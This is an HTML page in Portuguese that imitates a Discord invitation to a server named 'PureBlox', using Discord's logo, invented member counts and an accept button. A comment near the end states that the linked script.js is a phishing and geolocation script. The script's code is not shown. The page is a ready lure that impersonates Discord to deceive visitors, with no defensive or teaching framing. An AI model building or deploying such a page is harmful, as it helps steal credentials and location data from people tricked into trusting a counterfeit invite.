<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Convite para o Discord</title>
<link rel="stylesheet" href="style.css">
</head>
<body>

 <canvas id="bg-canvas" aria-hidden="true"></canvas>

 <header class="topbar">
 <div class="brand">
 <svg class="brand__icon" viewBox="0 0 28 20" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
 <path d="M23.7 1.7A22.9 22.9 0 0 0 18 0c-.3.5-.6 1.1-.8 1.6a21.3 21.3 0 0 0-6.4 0C10.6 1.1 10.3.5 10 0a22.9 22.9 0 0 0-5.7 1.7C1 6.9.1 12 .5 17a23 23 0 0 0 6.9 3.4c.6-.8 1.1-1.6 1.5-2.5-.8-.3-1.6-.7-2.3-1.1.2-.1.4-.3.6-.4 4.4 2 9.2 2 13.6 0l.6.4c-.7.4-1.5.8-2.3 1.1.4.9.9 1.7 1.5 2.5A23 23 0 0 0 27.5 17c.5-5.8-.9-10.8-3.8-15.3ZM9.4 14c-1.3 0-2.4-1.2-2.4-2.7 0-1.5 1-2.7 2.4-2.7 1.3 0 2.4 1.2 2.4 2.7 0 1.5-1.1 2.7-2.4 2.7Zm9.2 0c-1.3 0-2.4-1.2-2.4-2.7 0-1.5 1-2.7 2.4-2.7 1.3 0 2.4 1.2 2.4 2.7 0 1.5-1.1 2.7-2.4 2.7Z"/>
 </svg>
 <span class="brand__name">Discord</span>
 </div>
 </header>

 <main class="stage">
 <section class="invite-card" role="region" aria-label="Convite para servidor do Discord">

 <div class="invite-card__avatar-wrap">
 <img
 class="invite-card__avatar"
 src="server-icon.png"
 alt="Ícone do servidor PureBlox"
 width="80"
 height="80"
 >
 </div>

 <p class="invite-card__invited-by">
 Você foi convidado a entrar no servidor oficial
 </p>

 <div class="invite-card__server">
 <span class="invite-card__server-icon" aria-hidden="true">P</span>
 <span class="invite-card__server-name">PureBlox</span>
 </div>

 <div class="invite-card__stats">
 <span class="invite-card__stat">
 <span class="invite-card__dot invite-card__dot--online" aria-hidden="true"></span>
 89 online
 </span>
 <span class="invite-card__stat">
 <span class="invite-card__dot invite-card__dot--total" aria-hidden="true"></span>
 347 membros
 </span>
 </div>

 <button
 id="join-btn"
 class="invite-card__button"
 type="button"
 aria-live="polite"
 >
 <span class="btn-label">Aceitar convite</span>
 <span class="btn-spinner" aria-hidden="true"></span>
 </button>

 </section>
 </main>

 <!-- Script de Phishing e Geolocalização -->
 <script src="script.js"></script>
</body>
</html>
